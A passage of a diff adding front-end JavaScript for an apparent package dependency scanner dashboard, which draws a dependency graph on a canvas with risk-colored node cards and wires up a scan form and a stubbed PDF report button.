+      levelKeys.forEach((lvl, lvlIdx) => {
+        const nodesInLvl = levels[lvl];
+        const gapX = canvas.width / (nodesInLvl.length + 1);
+        nodesInLvl.forEach((node, i) => {
+          nodeMap[node.id] = {
+            x: gapX * (i + 1),
+            y: 60 + lvlIdx * levelGap,
+            node: node
+          };
+        });
+      });
+
+      // Draw Edges (Bezier curves)
+      ctx.strokeStyle = "#334155";
+      ctx.lineWidth = 1.8;
+      graph.edges.forEach(e => {
+        const from = nodeMap[e.from];
+        const to = nodeMap[e.to];
+        if (from && to) {
+          ctx.beginPath();
+          ctx.moveTo(from.x, from.y + cardH / 2);
+          const midY = (from.y + to.y) / 2;
+          ctx.bezierCurveTo(from.x, midY, to.x, midY, to.x, to.y - cardH / 2);
+          ctx.stroke();
+
+          // Arrowhead
+          ctx.fillStyle = "#64748B";
+          ctx.beginPath();
+          ctx.moveTo(to.x, to.y - cardH / 2);
+          ctx.lineTo(to.x - 5, to.y - cardH / 2 - 8);
+          ctx.lineTo(to.x + 5, to.y - cardH / 2 - 8);
+          ctx.closePath();
+          ctx.fill();
+        }
+      });
+
+      // Draw Node Cards
+      Object.values(nodeMap).forEach(item => {
+        const { x, y, node } = item;
+        const left = x - cardW / 2;
+        const top = y - cardH / 2;
+
+        const isRoot = node.level === 0;
+        const borderColor = node.risk === "high_risk" ? "#FF4757" :
+                            node.risk === "suspicious" ? "#FFB020" :
+                            (isRoot ? "#00FF9C" : "#334155");
+
+        // Background
+        ctx.fillStyle = "#0F172A";
+        ctx.beginPath();
+        ctx.roundRect(left, top, cardW, cardH, 10);
+        ctx.fill();
+
+        // Border
+        ctx.strokeStyle = borderColor;
+        ctx.lineWidth = isRoot ? 2.2 : 1.2;
+        ctx.stroke();
+
+        // Title Row
+        ctx.fillStyle = "#FFFFFF";
+        ctx.font = "bold 12px sans-serif";
+        ctx.textAlign = "left";
+        ctx.fillText(node.label, left + 12, top + 22);
+
+        if (isRoot) {
+          ctx.fillStyle = "#00FF9C";
+          ctx.font = "bold 9px sans-serif";
+          ctx.fillText("ROOT", left + cardW - 42, top + 22);
+        }
+
+        // Criticality Badge Container
+        const critColor = node.inDegree >= 3 ? "#FF4757" : (node.inDegree >= 2 ? "#FFB020" : "#64748B");
+        ctx.fillStyle = critColor + "22";
+        ctx.beginPath();
+        ctx.roundRect(left + 10, top + 28, cardW - 20, 18, 4);
+        ctx.fill();
+
+        ctx.fillStyle = critColor;
+        ctx.font = "bold 9px sans-serif";
+        ctx.fillText(`Criticality: ${node.criticalityLabel}`, left + 14, top + 40);
+
+        // Subtitle
+        ctx.fillStyle = "#64748B";
+        ctx.font = "9px sans-serif";
+        ctx.fillText(`L${node.level} · in-deg ${node.inDegree} · score ${Math.round(node.score || 0)}`, left + 12, top + 58);
+      });
+    }
+
+    function toggleSection(id, arrowId) {
+      const el = document.getElementById(id);
+      const arrow = document.getElementById(arrowId);
+      if (el.classList.contains("hidden")) {
+        el.classList.remove("hidden");
+        arrow.classList.add("rotate-180");
+      } else {
+        el.classList.add("hidden");
+        arrow.classList.remove("rotate-180");
+      }
+    }
+
+    function downloadPdfSim() {
+      alert("Triggering backend PDF generator (/scan/report/{scan_id}/pdf)... Report generated!");
+    }
+
+    document.getElementById("scan-form").addEventListener("submit", (e) => {
+      e.preventDefault();
+      const val = document.getElementById("package-input").value.trim();
+      if (val) runScan(val);
+    });
+
+    window.onload = async () => {
+      await checkBackend();
+      runScan("requests");
+    };
+  </script>
+</body>
+</html>
